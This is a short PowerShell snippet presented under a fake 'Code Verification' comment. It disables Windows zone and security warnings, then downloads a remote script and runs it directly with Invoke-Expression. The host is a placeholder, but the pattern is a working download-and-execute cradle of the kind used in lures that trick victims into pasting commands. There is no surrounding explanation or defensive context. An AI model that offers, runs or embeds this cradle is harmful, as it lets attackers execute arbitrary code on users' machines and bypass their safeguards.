<# Code Verification: 12345678 #>
$env:SEE_MASK_NOZONECHECKS = 1
iex ((New-Object Net.WebClient).DownloadString('https://example.invalid/resource.js'))
